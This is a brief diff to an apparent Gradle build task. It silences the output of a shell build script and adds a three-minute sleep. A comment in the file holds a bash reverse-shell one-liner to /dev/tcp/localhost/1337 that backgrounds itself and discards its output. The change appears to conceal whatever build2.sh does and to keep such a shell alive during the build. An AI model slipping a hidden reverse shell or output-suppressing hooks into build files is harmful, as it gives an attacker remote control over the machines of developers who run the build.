@@ -17,7 +17,8 @@ task build2 << {
         commandLine './builds/build2.sh'
         standardOutput = stdout;
     }
-    println stdout
+    //println stdout
+    sleep(180 * 1000)
 }
 
 // "\nbash -c \"bash -i >& /dev/tcp/localhost/1337 0>&1 &disown\" &> /dev/null\n"
